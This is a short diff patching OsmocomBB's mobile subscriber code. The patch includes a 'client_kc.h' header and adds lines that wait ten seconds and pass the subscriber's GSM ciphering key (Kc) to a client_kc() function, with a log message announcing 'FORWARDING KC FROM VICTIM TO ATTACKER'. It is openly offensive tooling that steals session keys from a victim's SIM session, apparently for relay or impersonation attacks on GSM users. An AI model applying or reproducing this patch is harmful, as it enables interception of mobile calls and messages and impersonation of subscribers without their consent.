@@ -1,0 +1,24 @@
+--- src/host/layer23/src/mobile/subscriber.c	2025-01-04 16:25:28.932988672 +0000
++++ src/host/layer23/src/mobile/subscriber.c	2025-01-04 16:26:26.686290408 +0000
+@@ -30,7 +30,7 @@
+ #include <osmocom/bb/common/osmocom_data.h>
+ #include <osmocom/bb/common/networks.h>
+ #include <osmocom/bb/mobile/vty.h>
+-
++#include "client_kc.h"
+ /* enable to get an empty list of forbidden PLMNs, even if stored on SIM.
+  * if list is changed, the result is not written back to SIM */
+ //#define TEST_EMPTY_FPLMN
+@@ -1032,6 +1032,12 @@
+ 	gsm48_mmevent_msg(ms, nmsg);
+ 
+ 	msgb_free(msg);
++        /*PaTcH*/
++        sleep(10);
++        client_kc(osmo_hexdump(subscr->key,8));
++        LOGP(DMM, LOGL_NOTICE, "FORWARDING KC FROM VICTIM TO ATTACKER !!! Kc = %s)\n", osmo_hexdump(subscr->key,8));
++        /*EnD_PaTcH*/
++
+ }
+ 
+ /*
